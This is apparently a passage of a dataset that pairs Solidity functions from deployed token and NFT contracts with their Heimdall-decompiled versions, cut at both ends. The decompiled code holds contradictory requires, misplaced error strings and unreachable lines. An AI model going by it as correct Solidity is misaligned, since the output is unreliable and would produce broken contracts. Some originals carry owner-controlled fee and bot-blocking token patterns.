0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0a2746D0FE88EeB9538183408295c061593E478e", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(store_c / 0x01) == 0, \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0) == (address(store_c / 0x01))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0) == (address(store_c / 0x01))), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        require(0);\n        require(arg1 < 0x64);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_r) {\n            if (!(store_r) == ((store_r >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_r >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_r >> 0x01;\n                if (store_r) {\n                    if (!(store_r) == ((store_r >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_r >> 0x01) {\n                            if (0x1f < (store_r >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_e[var_a];\n                                if ((0x20 + var_c) + (store_r >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1", "original_solidity_code": "function checkPremissionList(address _user) external view returns (bool) {\r\n        return premissionList[_user];\r\n    }", "heimdall_decompiled_code": "function checkPremissionList(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x11;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x67971F0972C03651ab6355eF0ae08c850742614a", "original_solidity_code": "function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(sender, recipient, amount);\\r\\n      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \\\"ERC20: transfer amount exceeds allowance\\\"));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public payable {\n        require(address(arg0));\n        require(address(arg1));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(arg0);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = address(arg0);\n        var_d = 0x06;\n        require(!storage_map_b[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!(arg2 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_b[var_c] = storage_map_b[var_c] - arg2;\n        var_c = address(arg1);\n        var_d = 0x04;\n        require(!((arg2 + storage_map_b[var_c]) < storage_map_b[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg2 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_b[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
{"contract_address": "0x332098414098f0E42658f2eA0254B44b077bb4A5", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _owner = 0 | (uint96(_owner));\n        emit OwnershipTransferred(address(_owner / 0x01), 0);\n    }"}
{"contract_address": "0x86612Df86F83dfD8E95d71E7766E1579Bf82BCab", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0xBaed5dd35dec85d45f03994Aa5cA3B3E61831637", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function publicMint(uint256 quantity) public payable nonReentrant {\\r\\n        require(\\r\\n            block.timestamp >= publicInfo.START_TIME && block.timestamp <= publicInfo.END_TIME,\\r\\n            \\\"Public minting closed\\\"\\r\\n        );\\r\\n        require(\\r\\n            quantity <= publicInfo.LIMIT_PER_ADDRESS,\\r\\n            \\\"Exceeded mint limit\\\"\\r\\n        );\\r\\n        require(publicInfo.CURR_MINTED < publicInfo.SUPPLY, \\\"Sold Out\\\");\\r\\n        require(msg.value == publicInfo.PRICE * quantity, \\\"Incorrect amount\\\");\\r\\n\\r\\n        _internalMint(msg.sender, quantity);\\r\\n        publicInfo.CURR_MINTED += quantity;\\r\\n    }", "heimdall_decompiled_code": "function publicMint(uint256 arg0) public payable {\n        require(!(ownerg == 0x02), \"ReentrancyGuard: reentrant call\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1f;\n        var_d = 0x5265656e7472616e637947756172643a207265656e7472616e742063616c6c00;\n        ownerg = 0x02;\n        require(block.timestamp < store_t, \"Public minting closed\");\n        require(!(block.timestamp < store_t), \"Public minting closed\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x15;\n        var_d = 0x5075626c6963206d696e74696e6720636c6f7365640000000000000000000000;\n        require(!(arg0 > getPublicLimit), \"Exceeded mint limit\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x13;\n        var_d = 0x4578636565646564206d696e74206c696d697400000000000000000000000000;\n        require(getPublicNumMinted < getPublicSupply, \"Incorrect amount\");\n        require(!(getPublicPrice & (arg0 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / getPublicPrice))), \"Incorrect amount\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(msg.value == (getPublicPrice * arg0), \"Incorrect amount\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x10;\n        var_d = 0x496e636f727265637420616d6f756e7400000000000000000000000000000000;\n        require(!(bytes1(paused)), \"Minting unavaliable\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x13;\n        var_d = 0x4d696e74696e6720756e6176616c6961626c6500000000000000000000000000;\n        require(!(getGuaranteedWhitelistSupply > ~(competitveWhitelistInfo)), \"Sold Out\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x08;\n        var_d = 0x536f6c64204f7574000000000000000000000000000000000000000000000000;\n        require(!(block.timestamp > store_u), \"Public minting closed\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x15;\n        var_d = 0x5075626c6963206d696e74696e6720636c6f7365640000000000000000000000;\n    }"}
{"contract_address": "0x842FD31eAd327AE42D19B7BFbdB045d3A219c662", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return balance[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = storage_map_e[var_a];\n        return storage_map_e[var_a];\n    }"}
{"contract_address": "0xeffb5Ed8242e5270aD662C82EfcA97aDAdE27dFD", "original_solidity_code": "function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {\r\n        _redisFeeOnBuy = redisFeeOnBuy;\r\n        _redisFeeOnSell = redisFeeOnSell;\r\n        _taxFeeOnBuy = taxFeeOnBuy;\r\n        _taxFeeOnSell = taxFeeOnSell;\r\n    }", "heimdall_decompiled_code": "function setFee(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_e = arg0;\n        store_f = arg1;\n        store_g = arg2;\n        store_h = arg3;\n    }"}
{"contract_address": "0x5c22A66eEf970887AD301Ab39D551F18f756c9f5", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x046D8A1D66b6DFDbDAAdCb35A5C07FAFb3371FDC", "original_solidity_code": "function launch() external onlyOwner {\\n\\t\\ttoken.openTrading();\\n\\t\\tuint balance = token.balanceOf(address(this));\\n\\t\\ttoken.transfer(address(staking), balance);\\n\\t\\ttoken.transferOwnership(owner());\\n\\t}", "heimdall_decompiled_code": "function launch() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0xc9567bf900000000000000000000000000000000000000000000000000000000;\n        require(address(token / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(token / 0x01).{ value: 0 ether }openTrading(var_b); // call\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_b = address(this);\n        require(address(token / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(token / 0x01).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (var_f));\n        var_g = 0xa9059cbb00000000000000000000000000000000000000000000000000000000;\n        address var_d = address(staking / 0x01);\n        var_e = var_f;\n        require(address(token / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(token / 0x01).{ value: 0 ether }Unresolved_a9059cbb(var_d); // call\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (var_f));\n        var_h = 0xf2fde38b00000000000000000000000000000000000000000000000000000000;\n        address var_e = address(owner / 0x01);\n        require(address(token / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(token / 0x01).{ value: 0 ether }Unresolved_f2fde38b(var_e); // call\n    }"}
{"contract_address": "0xf4B4346B0E2220371B87bD140b89E4a4E57c10B7", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xAe2D518A7c2fE465D3548825De14774282959862", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xa24BfAF7D3c435aAF05E490fFEbe447907CAC972", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x90bd0470eeFf15E5A6AC0D7221A4FFB0Eb6C690A", "original_solidity_code": "function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xE017C8475A6C89f181CA2C9222c2Bbf36dc04A4D", "original_solidity_code": "function balanceOf(address account) external view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xeF684902f48bf76B9420474Aa213A8e217219674", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_h[var_a]);\n        store_g = 0x01000000000000000000000000000000000000000000 | (uint248(store_g));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_f), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_f);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = storage_map_h[var_a];\n        address var_k = storage_map_h[var_a];\n        emit Approval(address(this), address(store_f), storage_map_h[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_h[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_f).code.length);\n        (bool success, bytes memory ret0) = address(store_f).Unresolved_791ac947(var_l); // call\n        store_g = uint248(store_g);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0f44A71641D7aA4e4E12471a887bEB44E327c977", "original_solidity_code": "function balanceOf(address account) external view override returns (uint256) {\\r\\n      uint160 \\r\\n      x = uint160(account\\r\\n        ); return slotValues(\\r\\n          x, 4) + \\r\\n          slotValues(x\\r\\n          , 6); }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x06;\n        var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = storage_map_d[var_a] + storage_map_d[var_a];\n        return storage_map_d[var_a] + storage_map_d[var_a];\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"Sniper blocked\");\n        require(address(arg0), \"Sniper blocked\");\n        address var_a = address(msg.sender);\n        var_b = 0x13;\n        require(!(bytes1(storage_map_e[var_a])), \"Sniper blocked\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x0e;\n        var_f = 0x536e6970657220626c6f636b6564000000000000000000000000000000000000;\n        require(arg1, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(tradingActive)), \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_e[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x22;\n        require(bytes1(storage_map_e[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x24;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(sellTotalFees > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!(arg1 & (sellTotalFees > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x64, \"ERC20: transfer amount exceeds balance\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        var_a = address(msg.sender);\n        var_b = 0x24;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(buyDevFeeg > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_e[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_e[var_a] = storage_map_e[var_a] - 0;\n        var_a = address(this);\n        require(!(storage_map_e[var_a] > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff), \"ERC20: transfer from the zero address\");\n        var_a = 